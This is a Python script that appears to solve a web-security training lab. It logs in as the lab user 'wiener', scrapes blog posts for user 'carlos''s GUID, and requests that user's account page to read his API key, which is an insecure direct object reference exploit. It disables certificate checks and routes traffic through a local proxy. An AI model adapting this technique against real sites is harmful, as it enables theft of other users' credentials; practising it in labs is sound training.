import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(s, url) :
    r = s.get(url, verify=False, proxies=proxies)
    matches = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', r.text)
    if matches :
        csrf =matches.group(1)
        return csrf
    else :
        return None

def broken_authentification_exploit(session, url) :
    # Get CSRF token  
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)
    
    # Login as the wiener user
    data = {"csrf":csrf_token, 'username':'wiener', 'password':'peter'}
    r = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in r.text :
        
        print("(+) The wiener user has logged in successfully!")
        print('(+) Retrieving the carlos user api key...')
        r = session.get(url, verify=False, proxies=proxies)
        # Search for all occurrences of the pattern and extract the post IDs
        idList = re.findall(r'<a class="button is-small" href="/post\?postId=(.*?)">View post</a>', r.text)

        # Convert the list to a set to remove duplicates (if needed)
        ids = list(set(idList))
        
        for id in ids :
            post_url = url + '/post?postId=' + id
            r = session.get(post_url, verify=False, proxies=proxies)
            if 'carlos' in r.text :
                matches  = re.search(r"\<p\>\<span id=blog-author\>\<a href='\/blogs\?userId=(.*)'\>carlos\<\/a\>", r.text)
                if matches :
                    guid = matches.group(1)
                
                    delete_url = url + "/my-account?id=" + guid
                    r = session.get(delete_url, verify=False, proxies=proxies)
                    matches = re.search(r'<div>Your API Key is: (.*)</div>', r.text)
                    
                    if matches :
                        api_key = matches.group(1)
                        print("(+) Here is the carlos' api key : " + api_key)
                        break
                    else :
                        print("(-) Could not retrieve the carlos' user api key.")
                        sys.exit(-1)
                else :
                    sys.exit(-1)
            
    else :
        print("Could not login as the wiener user!")
        sys.exit(-1)

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)